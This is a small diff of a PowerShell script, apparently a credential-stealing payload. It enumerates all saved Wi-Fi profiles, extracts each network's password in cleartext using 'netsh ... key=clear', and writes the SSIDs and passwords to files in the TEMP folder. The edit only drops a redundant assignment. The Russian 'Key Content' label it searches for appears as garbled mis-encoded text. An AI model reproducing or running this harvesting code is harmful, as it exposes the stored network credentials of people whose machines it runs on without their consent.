@@ -1,5 +1,5 @@
 $wifissid = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name}} | Format-Table -AutoSize | Out-String
-$wifipass = $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Ñîäåðæèìîå êëþ÷à\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
+$wifipass = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Ñîäåðæèìîå êëþ÷à\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
 
 $wifissid > $env:TEMP/wifi-ssid.txt
 $wifipass > $env:TEMP/wifi-pass.txt
